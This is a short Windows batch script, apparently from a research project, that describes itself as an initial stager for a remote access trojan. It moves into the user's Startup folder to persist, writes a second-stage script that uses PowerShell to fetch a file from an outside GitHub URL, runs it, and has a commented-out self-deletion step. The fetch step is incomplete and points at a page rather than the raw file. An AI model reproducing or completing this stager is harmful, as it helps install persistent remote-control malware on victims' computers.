@echo off
@REM initial stager for RAT

@REM varialbes
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directry
cd %STARTUP%

@REM TODO: build out stage two
@REM Write payloads to startup

(
    echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/blob/main/Original/Resources/poc.cmd'"
) > stage2.cmd

@REM run payload
powershell ./stage2.cmd

@REM cd back into initial Location
cd "%INITIALPATH%"
@REM del initial.cmd